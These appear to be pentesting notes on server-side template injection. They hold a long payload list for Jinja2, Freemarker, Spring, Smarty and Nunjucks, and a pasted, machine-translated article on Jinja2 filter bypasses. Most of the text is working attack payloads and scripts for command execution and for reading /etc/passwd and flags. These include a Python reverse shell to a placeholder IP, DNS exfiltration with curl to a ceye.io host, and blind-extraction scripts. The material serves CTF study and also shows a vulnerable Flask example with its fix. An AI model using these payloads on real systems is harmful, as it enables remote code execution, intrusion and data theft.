# Server Side Template Injection

is when a user is able to pass in a parameter that can control the template engine that is running on the server.

 usually you can test for SSTI using {{2+2}} as a test.
 Tool to test with:  https://github.com/epinna/tplmap
 
 Payloads: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection
 
use {{config}} to retrieve Flask secret information, see spider write up [[../../WriteUps/HackTheBox/Spider/WriteUp]]

bypass filter: https://chowdera.com/2020/12/20201221231521371q.html
 
 also good filter bypass: https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection
 
payload list from https://github.com/payloadbox/ssti-payloads
 ```plain
{{2*2}}[[3*3]]
{{config}} 
GET /{{config.__class__.__init__.__globals__['os'].popen('cat%20flag.txt').read()}}
{{3*3}}
{{3*'3'}}
<%= 3 * 3 %>
${6*6}
${{3*3}}
@(6+5)
#{3*3}
#{ 3 * 3 }
{{dump(app)}}
{{app.request.server.all|join(',')}}
{{config.items()}}
{{ [].class.base.subclasses() }}
{{''.class.mro()[1].subclasses()}}
{{ ''.__class__.__mro__[2].__subclasses__() }}
{% for key, value in config.iteritems() %}<dt>{{ key|e }}</dt><dd>{{ value|e }}</dd>{% endfor %}
{{'a'.toUpperCase()}} 
{{ request }}
{{self}}
<%= File.open('/etc/passwd').read %>
<#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("id")}
[#assign ex = 'freemarker.template.utility.Execute'?new()]${ ex('id')}
${"freemarker.template.utility.Execute"?new()("id")}
{{app.request.query.filter(0,0,1024,{'options':'system'})}}
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}
{{ config.items()[4][1].__class__.__mro__[2].__subclasses__()[40]("/etc/passwd").read() }}
{{''.__class__.mro()[1].__subclasses__()[396]('cat flag.txt',shell=True,stdout=-1).communicate()[0].strip()}}
{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(request.args.input).read()}}{%endif%}{%endfor%}
{$smarty.version}
{php}echo `id`;{/php}
{{['id']|filter('system')}}
{{['cat\x20/etc/passwd']|filter('system')}}
{{['cat$IFS/etc/passwd']|filter('system')}}
{{request|attr([request.args.usc*2,request.args.class,request.args.usc*2]|join)}}
{{request|attr(["_"*2,"class","_"*2]|join)}}
{{request|attr(["__","class","__"]|join)}}
{{request|attr("__class__")}}
{{request.__class__}}
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}
{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"new java.lang.String('xxx')\")}}
{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"whoami\\\"); x.start()\")}}
{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"netstat\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\")}}
{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"uname\\\",\\\"-a\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\")}}
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"ip\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/cat\", \"flag.txt\"]);'").read().zfill(417)}}{%endif%}{% endfor %}
${T(java.lang.System).getenv()}
${T(java.lang.Runtime).getRuntime().exec('cat etc/passwd')}
${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}
```

to auto test with a python script (see htb box spider)

# nonjucks node js template engine

http://disse.cting.org/2016/08/02/2016-08-02-sandbox-break-out-nunjucks-template-engine

```plain
{{7*7}}
{{range.constructor("console.log(123)")()}}
{{range.constructor("return global.process.mainModule.require('child_process').execSync('tail /etc/passwd')")()}}
```


Huge Bypass Cheat Cheat from https://chowdera.com/2020/12/20201221231521371q.html

```plain
On SSTI & bypass of jinja2
2020-12-17 17:52:50 【Hetian Wangan Laboratory】

Preface
SSTI（Server-Side Template Injection） Server side template injection in CTF It's not a new test point , I've learned a little before , But the recent big and small competitions, such as the Anxin Cup , Xiangyun cup , Taihu cup , Nanyou CTF, Shanghai college students' safety competition and other competitions have appeared frequently , And after the game, I saw all kinds of dazzling masters payload, There's no way to know how it works , It prompted me to write this article to summarize all kinds of bypass SSTI Methods .

Basic knowledge of
This article from Flask Template engine for Jinja2 Starting with ,CTF Most of them also use this template engine

The basic syntax of templates
The official document introduces the syntax of the template as follows

{% ... %} for Statements

{{ ... }} for Expressions to print to the template output

{# ... #} for Comments not included in the template output

#  ... ## for Line Statements
Let's take a look at it one by one

{%%}
It is mainly used to declare variables , It can also be used in conditional statements and loop statements .

{% set c= 'kawhi' %}
{% if 81==9*9 %}kawhi{% endif %}
{% for i in ['1','2','3'] %}kawhi{%endfor%}
{{}}
Used to print expressions to template output , For example, we usually type in 2-1,2*2, Or strings , Method of calling object , Will render the result

{{2-1}} # Output 1
{{2*2}} # Output 4
We usually use {{2*2}} Simply test whether the page exists SSTI

{##}
Represents a comment that is not included in the template output

##
There are and {%%} Same effect

The template injection here mainly uses {{}} and {%%}

Common magic methods
__class__
Used to return the class to which the object belongs

Python 3.7.8
>>> ''.__class__
<class 'str'>
>>> ().__class__
<class 'tuple'>
>>> [].__class__
<class 'list'>
__base__
Returns the class inherited by a class as a string

__bases__
Returns the class inherited by a class in the form of tuples

__mro__
Returns the order in which the parsing method is called , Returns all classes in the order from subclass to parent class to parent class

Python 3.7.8
>>> class Father():
...     def __init__(self):
...             pass
...
>>> class GrandFather():
...     def __init__(self):
...             pass
...
>>> class son(Father,GrandFather):
...     pass
...
>>> print(son.__base__)
<class '__main__.Father'>
>>> print(son.__bases__)
(<class '__main__.Father'>, <class '__main__.GrandFather'>)
>>> print(son.__mro__)
(<class '__main__.son'>, <class '__main__.Father'>, <class '__main__.GrandFather'>, <class 'object'>)
__subclasses__()
Get all subclasses of a class

__init__
All self-contained classes contain init Method , He is often used as a springboard to call globals

__globals__
All modules in the current location will be returned as dictionary type , Methods and global variables , Used for coordination init Use

Causes and defense of loopholes
There are two reasons for the template injection vulnerability , First, there are controllable user input variables , Second, the use of non fixed templates , Here's a simple idea of being SSTI The code for is as follows

ssti.py

from flask import Flask,request,render_template_string
app = Flask(__name__)

@app.route('/', methods=['GET', 'POST'])
def index():
    name = request.args.get('name')
    template = '''
<html>
  <head>
    <title>SSTI</title>
  </head>
 <body>
      <h3>Hello, %s !</h3>
  </body>
</html>
        '''% (name)
    return render_template_string(template)
if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, debug=True)
Let's simply type in a {{2-1}}, Back to 1, Indicates that there is template injection



And if there is SSTI Words , We can use the above magic method to construct a file that can be read or directly getshell A loophole in the



How to reject this loophole , In fact, it's very simple. You just need to use a fixed template , The correct code should be as follows

ssti2.py

from flask import Flask,request,render_template
app = Flask(__name__)

@app.route('/', methods=['GET', 'POST'])
def index():
	return render_template("index.html",name=request.args.get('name'))

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, debug=True)
index.html

<html>
  <head>
    <title>SSTI</title>
  </head>
 <body>
      <h3>Hello, {{name}} !</h3>
  </body>
</html>
You can see the output as it is {{2-1}}



The idea of constructing chain
Here's how to construct from scratch SSTI Loopholes payload, You can use it to exist on it SSTI Loopholes ssti.py Experimentalize

First step
Purpose ： Use __class__ To get the class corresponding to the built-in class

By using str,list,tuple,dict Wait to get

Python 3.7.8
>>> ''.__class__
<class 'str'>
>>> "".__class__
<class 'str'>
>>> [].__class__
<class 'list'>
>>> ().__class__
<class 'tuple'>
>>> {}.__class__
<class 'dict'>
The second step
Purpose ： Get object Base class

use __bases__[0] Get the base class

Python 3.7.8
>>> ''.__class__.__bases__[0]
<class 'object'>
use __base__ Get the base class

Python 3.7.8
>>> ''.__class__.__base__
<class 'object'>
use __mro__[1] perhaps __mro__[-1] Get the base class

Python 3.7.8
>>> ''.__class__.__mro__[1]
<class 'object'>
>>> ''.__class__.__mro__[-1]
<class 'object'>
The third step
use __subclasses__() Get the subclass list

Python 3.7.8
>>> ''.__class__.__bases__[0].__subclasses__()
... A bunch of subclasses 
Step four
In the subclass list, you can find getshell Class

Look for utilization classes
In the fourth step above , How to quickly find the utilization class

Using scripts to run indexes
Generally speaking, we should first know that we can getshell Class , Then run the index of these classes , Then I will talk about how to run the index , You can write it in detail getshell Class

Here we give a script to traverse locally , The principle is to traverse all subclasses first , Then traverse the subclass of the method referred to things , To find out if the method we need has been called , Here we use popen As an example

find.py

search = 'popen'
num = -1
for i in ().__class__.__bases__[0].__subclasses__():
    num += 1
    try:
        if search in i.__init__.__globals__.keys():
            print(i, num)
    except:
        pass
Let's run this script

λ python3 find.py
<class 'os._wrap_close'> 128
You can find object Class of the base class 128 The subclass is named os._wrap_close This class of is popen Method

Call it first __init__ Method to initialize the class

Python 3.7.8
>>> "".__class__.__bases__[0].__subclasses__()[128].__init__
<function _wrap_close.__init__ at 0x000001FCD0B21E58>
Call again __globals__ You can get the method returned as a dictionary within a method 、 Attribute equivalence

Python 3.7.8
>>> "".__class__.__bases__[0].__subclasses__()[128].__init__.__globals__
{'__name__': 'os'... Middle ellipsis ...<class 'os.PathLike'>}
And then you can call popen To execute an order

Python 3.7.8
>>> "".__class__.__bases__[0].__subclasses__()[128].__init__.__globals__['popen']('whoami').read()
'desktop-t6u2ptl\\think\n'
But the above method is limited to local search , Because doing CTF When it comes to the topic , We can't run this in the context of the topic find.py, Here we use hhhm Master's script directly to find subclasses

Let's first list all the subclasses

Python 3.7.8
>>> ().__class__.__bases__[0].__subclasses__()
... A bunch of subclasses 
Then put the subclass list in the following script a in , Then look for os._wrap_close This class

find2.py

import json

a = """
<class 'type'>,...,<class 'subprocess.Popen'>
"""

num = 0
allList = []

result = ""
for i in a:
    if i == ">":
        result += i
        allList.append(result)
        result = ""
    elif i == "\n" or i == ",":
        continue
    else:
        result += i
        
for k,v in enumerate(allList):
    if "os._wrap_close" in v:
        print(str(k)+"--->"+v)


Or use the following requests Script to run

find3.py

import requests
import time
import html
for i in range(0,300):
    time.sleep(0.06)
    payload="{{().__class__.__mro__[-1].__subclasses__()[%s]}}" % i
    url='http://ip:5000?name='
    r = requests.post(url+payload)
    if "catch_warnings" in r.text:
        print(r.text)
        print(i)
        break


tips： The following various methods are to use this idea to find that can getshell Class location

python3 Methods
os._wrap_close Class popen
This method is used in the above example ,payload as follows

{{"".__class__.__bases__[0].__subclasses__()[128].__init__.__globals__['popen']('whoami').read()}}
__import__ Medium os
Top up find.py Script search Change the variable to __import__

λ python3 find.py
<class '_frozen_importlib._ModuleLock'> 75
<class '_frozen_importlib._DummyModuleLock'> 76
<class '_frozen_importlib._ModuleLockManager'> 77
<class '_frozen_importlib._installed_safely'> 78
<class '_frozen_importlib.ModuleSpec'> 79
You can see that there is 5 It contains __import__ Of , Just use one of them

payload as follows

{{"".__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__import__('os').popen('whoami').read()}}
python2 Methods
because python3 and python2 There is a difference between the two versions , Here is the python2 Take it out alone and say

tips：python2 Of string Types are not directly subordinate to the base class , So use it twice __bases__[0]

Python 2.7.10
>>> ''.__class__.__bases__[0]
<type 'basestring'>
>>> ''.__class__.__bases__[0].__bases__[0]
<type 'object'>
file Class reads and writes files
This method can only be applied to python2, Because in python3 in file Class has been removed

>>> [].__class__.__bases__[0].__subclasses__()[40]
<type 'file'>
have access to dir see file Built in methods in objects

>>> dir(().__class__.__bases__[0].__subclasses__()[40])
['__class__', '__delattr__', '__doc__', '__enter__', '__exit__', '__format__', '__getattribute__', '__hash__', '__init__', '__iter__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', 'close', 'closed', 'encoding', 'errors', 'fileno', 'flush', 'isatty', 'mode', 'name', 'newlines', 'next', 'read', 'readinto', 'readline', 'readlines', 'seek', 'softspace', 'tell', 'truncate', 'write', 'writelines', 'xreadlines']
Then directly call the method inside ,payload as follows

Reading documents

{{().__class__.__bases__[0].__subclasses__()[40]('/etc/passwd').read()}}

{{().__class__.__bases__[0].__subclasses__()[40]('/etc/passwd').readlines()}}
warnings Class linecache
This method can only be used for python2, Because in python3 China will report an error 'function object' has no attribute 'func_globals', The guess should be python3 in func_globals Removed or something , If not, please point out

Let's take the top one find.py Script search The variable is assigned to linecache, To find something that contains linecache Class

λ python find.py
(<class 'warnings.WarningMessage'>, 59)
(<class 'warnings.catch_warnings'>, 60)
It's the same in the back ,payload as follows

{{[].__class__.__base__.__subclasses__()[60].__init__.func_globals['linecache'].os.popen('whoami').read()}}
python2&3 Methods
Here are python2 and python3 Two versions of the common method

__builtins__ Code execution
This method is more commonly used , Because he has two kinds of python All versions apply to

First __builtins__ Is a module containing a large number of built-in functions , We usually use python The reason why you can use some functions directly, such as abs,max, Because of __builtins__ This kind of module is in Python At startup, it imported , have access to dir(__builtins__) To see a list of calling methods , And then you can see that __builtins__ There are eval,__import__ Function of wait , So you can use this to execute commands .

Top up find.py Script search The variable is assigned to __builtins__, And find number one 140 Classes warnings.catch_warnings It contains him , And there are more classes that contain __builtins__, For example, the commonly used ones are email.header._ValueFormatter wait , This may be one of the reasons why this method is more popular

Call again eval It's OK to wait for functions and methods ,payload as follows

{{().__class__.__bases__[0].__subclasses__()[140].__init__.__globals__['__builtins__']['eval']("__import__('os').system('whoami')")}}

{{().__class__.__bases__[0].__subclasses__()[140].__init__.__globals__['__builtins__']['eval']("__import__('os').popen('whoami').read()")}}

{{().__class__.__bases__[0].__subclasses__()[140].__init__.__globals__['__builtins__']['__import__']('os').popen('whoami').read()}}

{{().__class__.__bases__[0].__subclasses__()[140].__init__.__globals__['__builtins__']['open']('/etc/passwd').read()}}
Or in the following two ways , Use templates to run loops

{% for c in ().__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('whoami').read()") }}{% endif %}{% endfor %}
{% for c in [].__class__.__base__.__subclasses__() %}
{% if c.__name__ == 'catch_warnings' %}
  {% for b in c.__init__.__globals__.values() %}
  {% if b.__class__ == {}.__class__ %}
    {% if 'eval' in b.keys() %}
      {{ b['eval']('__import__("os").popen("whoami").read()') }}
    {% endif %}
  {% endif %}
  {% endfor %}
{% endif %}
{% endfor %}


Read the file payload

{% for c in ().__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].open('filename', 'r').read() }}{% endif %}{% endfor %}
And then here's another point that few people mentioned

warnings.catch_warnings Class is defined internally _module=sys.modules['warnings'], then warnings The module contains __builtins__, That is to say, if you can find warnings.catch_warnings class , You can not use globals,payload as follows

{{''.__class__.__mro__[1].__subclasses__()[40]()._module.__builtins__['__import__']("os").popen('whoami').read()}}
To make a long story short , The principle is to find out first that contains __builtins__ Class , And then take advantage of

subprocess.Popen Conduct RCE
We can use find2.py seek subprocess.Popen This class , Can directly RCE,payload as follows

{{''.__class__.__mro__[2].__subclasses__()[258]('whoami',shell=True,stdout=-1).communicate()[0].strip()}}
Direct use of os
At first I thought this method could only be used for python2, Because when I was doing this locally python3 You can't find it directly containing os Class , But then it turned out python3 Actually, it can be used , It's mainly because the environment has this and that kind of things

Let's take the top one find.py Script search The variable is assigned to os, To find something that contains os Class

λ python find.py
(<class 'site._Printer'>, 69)
(<class 'site.Quitter'>, 74)
It's the same in the back ,payload as follows

{{().__class__.__base__.__subclasses__()[69].__init__.__globals__['os'].popen('whoami').read()}}
Get configuration information
We can sometimes use flask Built in functions such as url_for,get_flashed_messages, Even built-in objects request To query configuration information or construct payload

config
We usually use {{config}} Query configuration information , If the title is set, it is similar to app.config ['FLAG'] = os.environ.pop('FLAG'), You can go directly to {{config['FLAG']}} perhaps {{config.FLAG}} get flag

request
jinja2 There are objects in request

Python 3.7.8
>>> from flask import Flask,request,render_template_string
>>> request.__class__.__mro__[1]
<class 'object'>
Query some configuration information

{{request.application.__self__._get_data_for_json.__globals__['json'].JSONEncoder.default.__globals__['current_app'].config}}
structure ssti Of payload

{{request.__init__.__globals__['__builtins__'].open('/etc/passwd').read()}}
{{request.application.__globals__['__builtins__'].open('/etc/passwd').read()}}
url_for
Query configuration information

{{url_for.__globals__['current_app'].config}}
structure ssti Of payload

{{url_for.__globals__['__builtins__']['eval']("__import__('os').popen('whoami').read()")}}
get_flashed_messages
Query configuration information

{{get_flashed_messages.__globals__['current_app'].config}}
structure ssti Of payload

{{get_flashed_messages.__globals__['__builtins__'].eval("__import__('os').popen('whoami').read()")}}
Bypass the blacklist
CTF In the general test is how to bypass SSTI, We learn how to construct payload after , And learn how to bypass filtering , And then, because of the different environment ,payload The position of the class in the article may be different from that in the article , You need to test it yourself

Filtered a little bit
It's filtered out .

stay python in , The following representations can be used to access the properties of an object

{{().__class__}}
{{()["__class__"]}}
{{()|attr("__class__")}}
{{getattr('',"__class__")}}
That is to say, we can pass [],attr(),getattr() Come around a little bit

Use [] Bypass
Use a dictionary to access functions or classes, etc , The following two lines are equivalent

{{().__class__}}
{{()['__class__']}}
In this way , We can construct payload as follows

{{()['__class__']['__base__']['__subclasses__']()[433]['__init__']['__globals__']['popen']('whoami')['read']()}}
Use attr() Bypass
Use native JinJa2 Function of attr(), The following two lines are equivalent

{{().__class__}}
{{()|attr('__class__')}}
In this way , We can construct payload as follows

{{()|attr('__class__')|attr('__base__')|attr('__subclasses__')()|attr('__getitem__')(65)|attr('__init__')|attr('__globals__')|attr('__getitem__')('__builtins__')|attr('__getitem__')('eval')('__import__("os").popen("whoami").read()')}}
Use getattr() Bypass
This method is sometimes not feasible due to environmental problems , Will report a mistake 'getattr' is undefined, So the above two are preferred

Python 3.7.8
>>> ().__class__
<class 'tuple'>
>>> getattr((),"__class__")
<class 'tuple'>
Filter quotes
It's filtered out ' and "

request Bypass
flask There is a request The built-in object can get the requested information ,request It can be used 5 There are different ways to request information , We can use it to pass parameters around

request.args.name
request.cookies.name
request.headers.name
request.values.name
request.form.name

payload as follows

GET The way , utilize request.args Pass parameters

{{().__class__.__bases__[0].__subclasses__()[213].__init__.__globals__.__builtins__[request.args.arg1](request.args.arg2).read()}}&arg1=open&arg2=/etc/passwd
POST The way , utilize request.values Pass parameters

{{().__class__.__bases__[0].__subclasses__()[40].__init__.__globals__.__builtins__[request.values.arg1](request.values.arg2).read()}}
post:arg1=open&arg2=/etc/passwd
Cookie The way , utilize request.cookies Pass parameters

{{().__class__.__bases__[0].__subclasses__()[40].__init__.__globals__.__builtins__[request.cookies.arg1](request.cookies.arg2).read()}}
Cookie:arg1=open;arg2=/etc/passwd
The remaining two methods are similar , I won't repeat it here

chr Bypass
{{().__class__.__base__.__subclasses__()[§0§].__init__.__globals__.__builtins__.chr}}
It's going to blow up here first subclasses, obtain subclasses contains chr Class index of



And then you can use it chr To bypass the quotation marks needed to pass parameters , Then you need to use chr To construct the required characters

Here I've written a script to quickly build what I want ascii character

<?php
$a = 'whoami';
$result = '';
for($i=0;$i<strlen($a);$i++)
{
	$result .= 'chr('.ord($a[$i]).')%2b';
}
echo substr($result,0,-3);
?>
//chr(119)%2bchr(104)%2bchr(111)%2bchr(97)%2bchr(109)%2bchr(105)
Last payload as follows

{% set chr = ().__class__.__base__.__subclasses__()[7].__init__.__globals__.__builtins__.chr %}{{().__class__.__base__.__subclasses__()[257].__init__.__globals__.popen(chr(119)%2bchr(104)%2bchr(111)%2bchr(97)%2bchr(109)%2bchr(105)).read()}}
Filter the underline
It's filtered out _

Code bypass
Use hexadecimal encoding to bypass ,_ After coding is \x5f,. After coding is \x2E

payload as follows

{{()["\x5f\x5fclass\x5f\x5f"]["\x5f\x5fbases\x5f\x5f"][0]["\x5f\x5fsubclasses\x5f\x5f"]()[376]["\x5f\x5finit\x5f\x5f"]["\x5f\x5fglobals\x5f\x5f"]['popen']('whoami')['read']()}}
It can even be bypassed in full hexadecimal , By the way, bypass the keywords , Let me start with a python Scripts are easy to convert

string1="__class__"
string2="\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f"
def tohex(string):
  result = ""
  for i in range(len(string)):
      result=result+"\\x"+hex(ord(string[i]))[2:]
  print(result)

tohex(string1) #\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f
print(string2) #__class__
Make a random structure payload as follows

{{""["\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f"]["\x5f\x5f\x62\x61\x73\x65\x5f\x5f"]["\x5f\x5f\x73\x75\x62\x63\x6c\x61\x73\x73\x65\x73\x5f\x5f"]()[64]["\x5f\x5f\x69\x6e\x69\x74\x5f\x5f"]["\x5f\x5f\x67\x6c\x6f\x62\x61\x6c\x73\x5f\x5f"]["\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f"]["\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f"]("\x6f\x73")["\x70\x6f\x70\x65\x6e"]("whoami")["\x72\x65\x61\x64"]()}}
request Bypass
The filter quotes above have already been introduced , No more details here

Filter keywords
First of all, it depends on how keywords are filtered

If yes, replace with blank , You can try double writing to bypass , Or use blacklist logic loopholes to bypass , That is to use the last keyword of the blacklist to replace bypass

If direct ban 了 , You can use string splicing and other methods to bypass , Common methods are as follows

Concatenated characters bypass
Here's to filter class As an example , It's enclosed in brackets and then enclosed in quotation marks , It can be used + Or not

{{()['__cla'+'ss__'].__bases__[0]}}
{{()['__cla''ss__'].__bases__[0]}}
Write something about it payload as follows

{{()['__cla''ss__'].__bases__[0].__subclasses__()[40].__init__.__globals__['__builtins__']['ev''al']("__im""port__('o''s').po""pen('whoami').read()")}}
Or you can use join To put together

{{()|attr(["_"*2,"cla","ss","_"*2]|join)}}
See a master even use the pipe symbol to add format Method to splice the operation , This is what we usually call a formatted string , Among them %s By l Replace

{{()|attr(request.args.f|format(request.args.a))}}&f=__c%sass__&a=l
use str Native Methods
replace Bypass ,payload as follows

{{().__getattribute__('__claAss__'.replace("A","")).__bases__[0].__subclasses__()[376].__init__.__globals__['popen']('whoami').read()}}
decode Bypass , But this method can only be tested in python2 Next use ,payload as follows

{{().__getattribute__('X19jbGFzc19f'.decode('base64')).__base__.__subclasses__()[40]("/etc/passwd").read()}}
Alternative methods
Filter init, It can be used __enter__ or __exit__ replace

{{().__class__.__bases__[0].__subclasses__()[213].__enter__.__globals__['__builtins__']['open']('/etc/passwd').read()}}

{{().__class__.__bases__[0].__subclasses__()[213].__exit__.__globals__['__builtins__']['open']('/etc/passwd').read()}}
Filter config, We usually use {{config}} Get the current settings , If it is filtered, you can use the following payload Bypass

{{self}} ⇒ <TemplateReference None>
{{self.__dict__._TemplateReference__context}}
Filter brackets
It's filtered out [ and ]

Brackets in numbers
stay python You can use the following methods to access array elements

Python 3.7.8
>>> ["a","kawhi","c"][1]
'kawhi'
>>> ["a","kawhi","c"].pop(1)
'kawhi'
>>> ["a","kawhi","c"].__getitem__(1)
'kawhi'
That is to say, it can be used __getitem__ and pop Instead of brackets , Take the number... Of the list n position

payload as follows

{{().__class__.__bases__.__getitem__(0).__subclasses__().__getitem__(433).__init__.__globals__.popen('whoami').read()}

{{().__class__.__base__.__subclasses__().pop(433).__init__.__globals__.popen('whoami').read()}}
Brackets for magic methods
Calling magic methods does not use brackets , But if you filter the keywords , If you want to splice, you have to use brackets , Like here, if you filter at the same time class And brackets

You can use __getattribute__ Bypass

{{"".__getattribute__("__cla"+"ss__").__base__}}
Or it can cooperate with request Use it together

{{().__getattribute__(request.args.arg1).__base__}}&arg1=__class__
payload as follows

{{().__getattribute__(request.args.arg1).__base__.__subclasses__().pop(376).__init__.__globals__.popen(request.args.arg2).read()}}&arg1=__class__&arg2=whoami
This is also one of the ways to bypass keywords

Filter double braces
It's filtered out {{ and }}

Use dns Take out the data
use {%%} Replaced the {{}}, Use judgment sentences to do dns Take out the data

{% if ().__class__.__base__.__subclasses__()[433].__init__.__globals__['popen']("curl `whoami`.k1o75b.ceye.io").read()=='kawhi' %}1{% endif %}
And then in ceye The platform can receive data



Blind note
If that doesn't work , Consider using blind injection , Here attached p0 Master's script

# -*- coding: utf-8 -*-
import requests

url = 'http://ip:5000/?name='

def check(payload):
    r = requests.get(url+payload).content
    return 'kawhi' in r

password  = ''
s = r'0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!"$\'()*+,-./:;<=>?@[\\]^`{|}~\'"_%'

for i in xrange(0,100):
    for c in s:
        payload = '{% if ().__class__.__bases__[0].__subclasses__()[40].__init__.__globals__.__builtins__.open("/etc/passwd").read()['+str(i)+':'+str(i+1)+'] == "'+c+'" %}kawhi{% endif %}'
        if check(payload):
            password += c
            break
    print password
print Mark
The reason why we want to dnslog Take out data and use blind annotation , It's because of the use of {%%} There will be no echo , Here you can use print To make a marker so that it has an echo , such as {%print config%},payload as follows

{%print ().__class__.__bases__[0].__subclasses__()[40].__init__.__globals__['__builtins__']['eval']("__import__('os').popen('whoami').read()")%}
payload Advancement and expansion
Here I'm based on the combination of various methods above to bypass the blacklist , Yes CTF Some of the methods used in and payload Let's make a little summary , But in general , As long as it's not too biased or too roundabout , It's enough to combine the above methods , The following is just an extension

Filter _ and . and '
Here's an unusual way , It's mainly about finding _frozen_importlib_external.FileLoader Of get_data() Method , The first is the parameter 0, The second is the name of the file to be read ,payload as follows

{{().__class__.__bases__[0].__subclasses__()[222].get_data(0,"app.py")}}
After using hexadecimal wrapping ,payload as follows

{{()["\x5f\x5fclass\x5f\x5f"]["\x5F\x5Fbases\x5F\x5F"][0]["\x5F\x5Fsubclasses\x5F\x5F"]()[222]["get\x5Fdata"](0, "app\x2Epy")}}
Filter args and . and _
Before, Anheng played in February in y1ng Master Blog saw a payload, The principle is not difficult , It's used here attr() Bypass point ,values Bypass args,payload as follows

{{()|attr(request['values']['x1'])|attr(request['values']['x2'])|attr(request['values']['x3'])()|attr(request['values']['x4'])(40)|attr(request['values']['x5'])|attr(request['values']['x6'])|attr(request['values']['x4'])(request['values']['x7'])|attr(request['values']['x4'])(request['values']['x8'])(request['values']['x9'])}}

post:x1=__class__&x2=__base__&x3=__subclasses__&x4=__getitem__&x5=__init__&x6=__globals__&x7=__builtins__&x8=eval&x9=__import__("os").popen('whoami').read()
Import the main function and read the variables
There are some topics that we don't need to go to getshell, such as flag Directly exposed to variables , Put it like this /flag File loading to flag It's in this variable

f = open('/flag','r')
flag = f.read()
We can go through import Is to import __main__ The main function reads variables ,payload as follows

{%print request.application.__globals__.__getitem__('__builtins__').__getitem__('__import__')('__main__').flag %}
Unicode Bypass
This method is from An Xun Cup 2020 official Writeup What I learned , Let's go straight to the subject payload

{%print(lipsum|attr(%22\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f%22))|attr(%22\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f%22)(%22os%22)|attr(%22popen%22)(%22whoami%22)|attr(%22read%22)()%}
there print Bypass {{}} and attr Bypass . As has been said above, I will not repeat it here

And then here's lipsum use {{lipsum}} It's a test. It's a method

<function generate_lorem_ipsum at 0x7fcddfa296a8>

And then call it directly with him __globals__ Discovery can be executed directly os command , We measured it and found that __builtins__ It can also be used. , I learned a new way , It can only be said that the masters tql

{{lipsum.__globals__['os'].popen('whoami').read()}}
{{lipsum.__globals__['__builtins__']['eval']("__import__('os').popen('whoami').read()")}}
Back to the point , It's used here Unicode Encoding bypasses keywords , The following two lines are equivalent

{{()|attr("__class__")}}
{{()|attr("\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f")}}
After knowing these two points , The official gave it to payload It's clear that , Unravel the code as follows

{%print(lipsum|attr("__globals__"))|attr("__getitem__")("os")|attr("popen")("whoami")|attr("read")()%}
And then I'll give you a Unicode Mutual php Script

<?php
// String rotation Unicode code 
function unicode_encode($strLong) {
  $strArr = preg_split('/(?<!^)(?!$)/u', $strLong);// Split string into array ( With Chinese characters )
  $resUnicode = '';
  foreach ($strArr as $str)
  {
      $bin_str = '';
      $arr = is_array($str) ? $str : str_split($str);// Get the inner array representation of characters , here $arr It should be similar to array(228, 189, 160)
      foreach ($arr as $value)
      {
          $bin_str .= decbin(ord($value));// To a number and then to a binary string ,$bin_str It should be similar to 111001001011110110100000, If it's Chinese characters " you "
      }
